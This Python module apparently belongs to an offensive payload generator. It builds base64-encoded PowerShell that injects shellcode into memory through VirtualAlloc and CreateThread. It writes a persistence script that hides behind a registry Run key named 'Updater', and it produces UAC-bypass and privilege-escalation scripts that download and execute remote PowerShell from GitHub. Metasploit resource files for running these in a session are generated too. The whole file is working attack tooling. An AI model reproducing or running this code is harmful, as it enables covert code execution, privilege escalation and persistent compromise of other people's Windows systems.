import base64
import re
from main import *

class EXTRAS(object):
    def __init__(self,shellcode):
        self.ez2read_shellcode = ''
        for byte in shellcode:
            self.ez2read_shellcode += '\\x%s' % byte.encode('hex')

        self.injectshellcode_layout = FUNCTIONS().powershellShellcodeLayout(self.ez2read_shellcode).rstrip(',')
        self.injectshellcode_sleep = """Start-Sleep -s 60;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
            self.injectshellcode_layout)
        self.injectshellcode_nosleep = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
            self.injectshellcode_layout)

    def PERSISTENCE(self):
        with open('persist.ps1', 'w') as persistfile:
            persistfile.write("echo \"%s\" | out-file $env:USERPROFILE/update.txt;New-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Updater -PropertyType String -Value 'C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -c \"powershell -exec bypass -NonInteractive -WindowStyle Hidden -enc (Get-Content $env:USERPROFILE\update.txt)\"'" % base64.b64encode(self.injectshellcode_sleep.encode('utf_16_le')))
            persistfile.close()
        with open('persist.rc', 'w') as persistfilerc:
            persistfilerc.write("""run post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1""")
            persistfilerc.close()
            return self.ez2read_shellcode

    def UACBYPASS(self, version):
        uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
        if version == "7":
            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
            base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
        elif version == "10":
            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1");\nInvoke-SDCLTBypass -Command \"powershell -enc %s\" """ % (
            base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
        with open('bypassuac.ps1', 'w') as uacbypassfile:
            uacbypassfile.write(uacbypassfilecontent)
            uacbypassfile.close()
        with open('uacbypass.rc', 'w') as uacbypassfilerc:
            uacbypassfilerc.write(uacbypassrcfilecontents)
            uacbypassfilerc.close()
            return self.ez2read_shellcode

    def ALLCHECKS(self):
        with open('allchecks.ps1', 'w') as allchecksfile:
            allchecksfile.write(
                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
            allchecksfile.close()
            return self.ez2read_shellcode

    def RETURN_EZ2READ_SHELLCODE(self):
        return self.ez2read_shellcode
